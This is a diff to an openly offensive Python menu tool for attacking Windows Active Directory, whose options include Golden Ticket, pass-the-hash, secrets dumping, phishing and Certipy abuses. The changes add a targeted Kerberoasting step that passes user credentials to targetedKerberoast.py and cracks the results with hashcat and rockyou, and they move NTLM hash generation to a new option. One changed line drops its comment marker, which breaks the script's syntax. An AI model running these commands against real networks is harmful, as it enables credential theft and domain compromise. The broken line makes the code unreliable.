@@ -789,10 +789,10 @@ def options():
    print('\u2551' + "(03) Re/Set IP  ADDRESS (13) Re/Set FILE NAME (33) Services (43) Sam Dump Users (53) KerberosBrute (63) Gold Ticket (73) ExplScanner (83) GenSSHKeyID (93 ) SSHKeyID (233) UDP PORTS  Scan (343) Edit NTLM Hashes (443) Enum DOMAIN  (602) LAPS    Dumper (702) Certipy ESC2                        " + '\u2551')   
    print('\u2551' + "(04) Re/Set LIVE  PORTS (14) Re/Set SHARENAME (34) AT  Exec (44) REGistry Hives (54) KerbeRoasting (64) Gold DC PAC (74) Expl Finder (84) GenListUser (94 ) Telnet   (234) Basic Serv Scan (344) Edit   Host.conf (444) Recon DOMAIN (603) Secrets   Dump (703) Certipy ESC3                        " + '\u2551')
    print('\u2551' + "(05) Re/Set WEBSITE URL (15) Re/Set SERVERS   (35) DComExec (45) Enum EndPoints (55) ASREPRoasting (65) Disp Ticket (75) ExplCreator (85) GenListPass (95 ) Netcat   (235) Light Serv Scan (345) Edit Resolv.conf (445) Enum Sub-DOM (604) Crack-Map-Exec (704) Certipy ESC4                        " + '\u2551')
-   print('\u2551' + "(06) Re/Set USER   NAME (16) Re/Set REV SHELL (36) PS  Exec (46) Rpc ClientServ (56) PASSWORD2HASH (66) PSExec HASH (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) EnumVirtHOST (605) Domain    Dump (705) Certipy ESC5                        " + '\u2551')
+   print('\u2551' + "(06) Re/Set USER   NAME (16) Re/Set REV SHELL (36) PS  Exec (46) Rpc ClientServ (56) TARGDRoasting (66) PSExec HASH (76) Dir Listing (86) NTDSDECRYPT (96 ) MSSQL    (236) Heavy Serv Scan (346) Edit ProxyChains (446) EnumVirtHOST (605) Domain    Dump (705) Certipy ESC5                        " + '\u2551')
    print('\u2551' + "(07) Re/Set PASS   WORD (17) Re/Set SERV TIME (37) SMB Exec (47) Smb ClientServ (57) Pass the HASH (67) SmbExecHASH (77) SNMP Walker (87) Hail! HYDRA (97 ) MySQL    (237) WordPress  Scan (347) Edit  Kerb5.conf (447) FUZZ Sub-DOM (606) Blood    Hound (706) Certipy ESC6 (996) MANUAL CHISEL64  " + '\u2551')
    print('\u2551' + "(08) Re/Set NTLM   HASH (28) Re/Set Community (38) WMI Exec (48) Smb Map SHARES (58) OverPass HASH (68) WmiExecHASH (78) ManPhishCod (88) RedisClient (98 ) WinRm    (238) WP Plugin  Scan (348) ADD AD Usernames (448) HTTP GitDump (607) Neo4j  Console (707) Certipy ESC7 (997) AUTO   CHISEL64  " + '\u2551')
-   print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59)               (69)             (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239) Nuclei  Scanner (349) LFI OS   Checker (449)              (608) Neo4j Database (708) Certipy ESC8 (998) SSH PortForward  " + '\u2551')
+   print('\u2551' + "(09) Re/Set TICKET NAME (29) Re/Set FUZZRIDER (39) NFS List (49) Smb Dump Files (59) PASSWORD2HASH (69)             (79) AutoPhisher (89) Remote Sync (99 ) RemDesk  (239) Nuclei  Scanner (349) LFI OS   Checker (449)              (608) Neo4j Database (708) Certipy ESC8 (998) SSH PortForward  " + '\u2551')
    print('\u2551' + "(10) Re/Set DOMAIN NAME (30) Re/Set WORD LIST (40) NFSMount (50) Smb MountSHARE (60)               (70) Enum4Linux  (80) MSF Console (90) Rsync Dumps (100) RDPBrute (240)                 (350) LFI     Wordlist (450)              (609) BloodHound GUI (709) Certipy ESC9 (999)", end= ' ')
    if proxyChains == 1:
       print(colored(menuName.rstrip(" "),colour0, attrs=['blink']), end= ' ' + "     " + '\u2551')
@@ -926,9 +926,9 @@ workDir = "BLACKBRIAR"
 explDir = "OUTCOME"
 powrDir = "LARX"
 fileExt = "py,sh,js,xlsx,docx,doc,txt,xml,bak,zip,php,html,pdf,dat,ps1"	# FILE EXTENSIONS
-keyPath = "python3 /usr/share/doc/python3-impacket/examples/"		# PATH 2 IMPACKET
+keyPath = "python3 /usr/local/bin/" #/usr/share/doc/python3-impacket/examples/"  IMPACKET
 
-# -------------------------------------------------------------------------------------
+ -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
 # Version : TREADSTONE                                                             
@@ -2608,28 +2608,24 @@ while True:
          localCOM("hashcat -m 18200 --force -a 0 hashroast2.tmp /usr/share/wordlists/rockyou.txt -o cracked2.tmp 2>&1 > temp.tmp")
          catsFile("cracked2.tmp")       
       prompt()
-
+      
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
 # Version : TREADSTONE                                                             
-# Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
+# Details : Menu option selected - targetedKerberoast.py
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
-   if selection == '56':
-      checkParam = test_PAS()
-      if checkParam != 1:    
-         NTM = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
-         NTM = binascii.hexlify(NTM)
-         NTM = str(NTM)
-         NTM = NTM.lstrip("b'")
-         NTM = NTM.rstrip("'")                
-         for x in range(0, maxUser):
-            if USER[x].rstrip(" ") == USR.rstrip(" "):
-               HASH[x] = NTM.rstrip(" ")
-         print("[+] Created hash value " + NTM + "...")
-         NTM = spacePadding(NTM, COL1)
+   if selection =='56':
+      checkParam = test_DOM()                
+      if checkParam != 1:
+         print(colored("[*] Peforming a tatargeted Roasting please wait this could take sometime ...", colour3))
+         localCOM(keyPath + "targetedKerberoast.py -d " + DOM.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p " + PAS.rstrip(" ") + " -o targetedroast.tmp 2>&1 > temp.tmp" )
+         catsFile("targetedroast.tmp")
+         print(colored("[*] Cracking hash values if they exists...\n", colour3))
+         localCOM("hashcat -m 18200 --force -a 0 targetedroast.tmp /usr/share/wordlists/rockyou.txt -o cracked2.tmp 2>&1 > temp.tmp")
+         catsFile("cracked2.tmp")       
       prompt()
 
 # ------------------------------------------------------------------------------------- 
@@ -2711,7 +2707,30 @@ while True:
                TGT = privCheck()
          else:
             print("[+] TGT was not generated...")                              
-      prompt()     
+      prompt()           
+      
+# ------------------------------------------------------------------------------------- 
+# AUTHOR  : Terence Broadbent                                                    
+# CONTRACT: GitHub
+# Version : TREADSTONE                                                             
+# Details : Menu option selected - print binascii.hexlify(hashlib.new("md4", "<password>".encode("utf-16le")).digest())'
+# Modified: N/A
+# -------------------------------------------------------------------------------------
+
+   if selection == '59':
+      checkParam = test_PAS()
+      if checkParam != 1:    
+         NTM = hashlib.new("md4", PAS.rstrip(" ").encode("utf-16le")).digest()
+         NTM = binascii.hexlify(NTM)
+         NTM = str(NTM)
+         NTM = NTM.lstrip("b'")
+         NTM = NTM.rstrip("'")                
+         for x in range(0, maxUser):
+            if USER[x].rstrip(" ") == USR.rstrip(" "):
+               HASH[x] = NTM.rstrip(" ")
+         print("[+] Created hash value " + NTM + "...")
+         NTM = spacePadding(NTM, COL1)
+      prompt()
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
